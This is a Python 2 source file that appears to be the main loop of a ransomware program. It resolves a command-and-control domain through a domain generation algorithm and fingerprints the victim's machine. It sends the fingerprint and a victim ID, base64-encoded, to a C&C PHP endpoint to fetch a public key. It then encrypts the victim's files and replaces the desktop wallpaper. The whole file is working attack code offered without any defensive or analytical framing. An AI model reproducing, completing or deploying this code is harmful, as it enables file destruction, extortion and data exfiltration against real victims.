from id_gen import *
from authcode import *
from check_dga import *
from change_wallpaper import *
import encrypt_files
import json, bz2, urllib2,base64, ctypes, os

#kill switch phase and self delete
#intialisation phase
#To get the needed domain
domain = ""
domain = check_dga()
if domain=="":
    exit("No domain found")

#Creating Authcode
auth_code = create_authcode();

#Fingerprinting the machine
fingerprint_values = get_fingerprint();

#Generating a ID for the machine based on fingerprinting
ransomware_id = get_ransomware_id();

#Preparing parameter to send
compressed = bz2.compress(json.dumps(fingerprint_values));

#Requesting C&C Server for the Public key
pub_key = urllib2.urlopen("http://"+domain+"/ransomware/c2c/control.php?if_i_look_back_i_m_lost="+auth_code+"&winter_is_coming="+ransomware_id+"&seven_kingdoms="+base64.b64encode(json.dumps(fingerprint_values))).read()

#Encrypt module that generates AES Key that is stored after public key encryption
encrypt_files.encrypt_files(pub_key)

#change wallpaper
change_wallpaper(os.getcwd()+"\encrypted_wallpaper.png")

print "Files are encrypted!!!"







